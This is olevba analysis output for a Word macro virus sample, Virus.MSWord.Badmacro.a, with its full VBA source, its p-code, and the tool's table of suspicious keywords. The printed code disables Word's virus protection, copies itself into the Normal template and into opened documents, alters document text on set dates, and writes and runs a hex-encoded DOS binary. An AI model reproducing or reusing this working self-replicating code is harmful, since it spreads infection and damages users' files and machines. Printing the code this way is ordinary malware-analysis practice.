olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Badmacro.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Badmacro.a - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Ñîâñåì ïëîõîé ìàêðîñ."
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoOpen"
 On Error Resume Next
 Options.VirusProtection = False
 Options.SaveNormalPrompt = False
 Application.OrganizerCopy Source:=ActiveDocument.FullName, _
  Destination:=NormalTemplate.FullName, Name:="NewMacros", _
  Object:=wdOrganizerObjectProjectItems
 Application.OrganizerCopy Destination:=ActiveDocument.FullName, _
  Source:=NormalTemplate.FullName, Name:="NewMacros", _
  Object:=wdOrganizerObjectProjectItems
End Sub

Sub AutoClose()
Attribute AutoClose.VB_Description = "Reread Version 1.2!"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoClose"
 On Error Resume Next
 Dim stroka As String
 stroka = "BB 1B 01 B9 FF 00 31 C0 88 E0 E6 70 EB 00 8A 07 43 FE C4 " & _
    "E6 71 E2 F1 B4 4C CD 21 " & _
    "26 77 24 FF 16 47 00 17 02 98 26 02 50 80 00 00 40 65 F0 F2 0F " & _
    "80 02 00 3C 2F 00 30 71 22 00 00 00 00 00 00 00 00 FE 07 10 FF " & _
    "FF FD 07 3F 08 9C 00 3C 19 80 FF FF FF FD FF FF FF 0F 78 9B F8 " & _
    "19 88 FC F1 FC 00 88 FF 00 3F 02 07 F0 F6 DC FF FE 2A 64 00 00 " & _
    "BF 67 E0 FF 00 00 00 00 C0 80 FF FF 9F 98 FE 44 F7 7F FF 00 00 " & _
    "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF 11 C5 FF FF " & _
    "FF 7F 26 77 24 FF 16 47 00 17 02 98 26 02 40 80 00 00 40 65 F0 " & _
    "F2 0F 80 02 00 3C 2F 00 30 71 22 00 00 00 00 00 00 00 00 FE 07 " & _
    "10 FF FF FD 07 3F 08 9C 00 3C 19 80 FF FF FF FD FF FF FF 0F 78 " & _
    "9B F8 19 88 FC F1 FC 00 88 FF 00 3F 02 07 F0 F6 DC FF FE 2A 64 " & _
    "00 00 BF 67 E0 FF 00 00 00 00 C0 80 FF FF 9F 98 FE 44 F7 7F FF " & _
    "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF 11 C5 " & _
    "FF FF FF 7F"

 Options.VirusProtection = False
 Options.SaveNormalPrompt = False
 Application.OrganizerCopy Source:=ActiveDocument.FullName, _
  Destination:=NormalTemplate.FullName, Name:="NewMacros", _
  Object:=wdOrganizerObjectProjectItems
 Application.OrganizerCopy Destination:=ActiveDocument.FullName, _
  Source:=NormalTemplate.FullName, Name:="NewMacros", _
  Object:=wdOrganizerObjectProjectItems
If Day(Date) = 1 Or Day(Date) = 13 Then
Set myRange = ActiveDocument.Range(Start:=0, End:=0)
With myRange.Find
    .ClearFormatting
    .Text = "òóò"
    With .Replacement
        .ClearFormatting
        .Text = "òàì"
    End With
    .Execute Replace:=wdReplaceAll, Format:=True, MatchCase:=False, _
        MatchWholeWord:=False
End With
End If
If Day(Date) > 23 Then
Open "c:\qstart.com" For Output As #1
For A = 0 To Len(stroka) / 3 - 1
b = Val("&h" & Mid$(stroka, A * 3 + 1, 3))
Print #1, Chr$(b);
Next
Close #1
v = Shell("c:\qstart.com", vbMinimizedNoFocus)
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Badmacro.a - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Badmacro.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/NewMacros - 4563 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' 	LineCont 0x0008 09 00 02 00 13 00 02 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #5:
' 	LineCont 0x0008 09 00 02 00 13 00 02 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #6:
' 	EndSub 
' Line #7:
' Line #8:
' 	FuncDefn (Sub AutoClose())
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' 	Dim 
' 	VarDefn stroka (As String)
' Line #11:
' 	LineCont 0x0038 04 00 04 00 06 00 04 00 08 00 04 00 0A 00 04 00 0C 00 04 00 0E 00 04 00 10 00 04 00 12 00 04 00 14 00 04 00 16 00 04 00 18 00 04 00 1A 00 04 00 1C 00 04 00 1E 00 04 00
' 	LitStr 0x0039 "BB 1B 01 B9 FF 00 31 C0 88 E0 E6 70 EB 00 8A 07 43 FE C4 "
' 	LitStr 0x0018 "E6 71 E2 F1 B4 4C CD 21 "
' 	Concat 
' 	LitStr 0x003F "26 77 24 FF 16 47 00 17 02 98 26 02 50 80 00 00 40 65 F0 F2 0F "
' 	Concat 
' 	LitStr 0x003F "80 02 00 3C 2F 00 30 71 22 00 00 00 00 00 00 00 00 FE 07 10 FF "
' 	Concat 
' 	LitStr 0x003F "FF FD 07 3F 08 9C 00 3C 19 80 FF FF FF FD FF FF FF 0F 78 9B F8 "
' 	Concat 
' 	LitStr 0x003F "19 88 FC F1 FC 00 88 FF 00 3F 02 07 F0 F6 DC FF FE 2A 64 00 00 "
' 	Concat 
' 	LitStr 0x003F "BF 67 E0 FF 00 00 00 00 C0 80 FF FF 9F 98 FE 44 F7 7F FF 00 00 "
' 	Concat 
' 	LitStr 0x003F "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF 11 C5 FF FF "
' 	Concat 
' 	LitStr 0x003F "FF 7F 26 77 24 FF 16 47 00 17 02 98 26 02 40 80 00 00 40 65 F0 "
' 	Concat 
' 	LitStr 0x003F "F2 0F 80 02 00 3C 2F 00 30 71 22 00 00 00 00 00 00 00 00 FE 07 "
' 	Concat 
' 	LitStr 0x003F "10 FF FF FD 07 3F 08 9C 00 3C 19 80 FF FF FF FD FF FF FF 0F 78 "
' 	Concat 
' 	LitStr 0x003F "9B F8 19 88 FC F1 FC 00 88 FF 00 3F 02 07 F0 F6 DC FF FE 2A 64 "
' 	Concat 
' 	LitStr 0x003F "00 00 BF 67 E0 FF 00 00 00 00 C0 80 FF FF 9F 98 FE 44 F7 7F FF "
' 	Concat 
' 	LitStr 0x003F "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF 11 C5 "
' 	Concat 
' 	LitStr 0x000B "FF FF FF 7F"
' 	Concat 
' 	St stroka 
' Line #12:
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #15:
' 	LineCont 0x0008 09 00 02 00 13 00 02 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #16:
' 	LineCont 0x0008 09 00 02 00 13 00 02 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #17:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	ParamNamed Start 
' 	LitDI2 0x0000 
' 	ParamNamed End 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	Set myRange 
' Line #19:
' 	StartWithExpr 
' 	Ld myRange 
' 	MemLd Find 
' 	With 
' Line #20:
' 	ArgsMemCallWith ClearFormatting 0x0000 
' Line #21:
' 	LitStr 0x0003 "òóò"
' 	MemStWith Then 
' Line #22:
' 	StartWithExpr 
' 	MemLdWith Replacement 
' 	With 
' Line #23:
' 	ArgsMemCallWith ClearFormatting 0x0000 
' Line #24:
' 	LitStr 0x0003 "òàì"
' 	MemStWith Then 
' Line #25:
' 	EndWith 
' Line #26:
' 	LineCont 0x0004 0E 00 08 00
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	LitVarSpecial (True)
' 	ParamNamed Format$ 
' 	LitVarSpecial (False)
' 	ParamNamed MatchCase 
' 	LitVarSpecial (False)
' 	ParamNamed MatchWholeWord 
' 	ArgsMemCallWith Execute 0x0004 
' Line #27:
' 	EndWith 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Gt 
' 	IfBlock 
' Line #30:
' 	LitStr 0x000D "c:\qstart.com"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #31:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld stroka 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Div 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #32:
' 	LitStr 0x0002 "&h"
' 	Ld stroka 
' 	Ld A 
' 	LitDI2 0x0003 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$$ 0x0003 
' 	Concat 
' 	ArgsLd Val 0x0001 
' 	St B 
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld B 
' 	ArgsLd Chr$ 0x0001 
' 	PrintItemSemi 
' 	PrintEoS 
' Line #34:
' 	StartForVariable 
' 	Next 
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #36:
' 	LitStr 0x000D "c:\qstart.com"
' 	Ld vbMinimizedNoFocus 
' 	ArgsLd Shell 0x0002 
' 	St v 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedNoFocus  |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

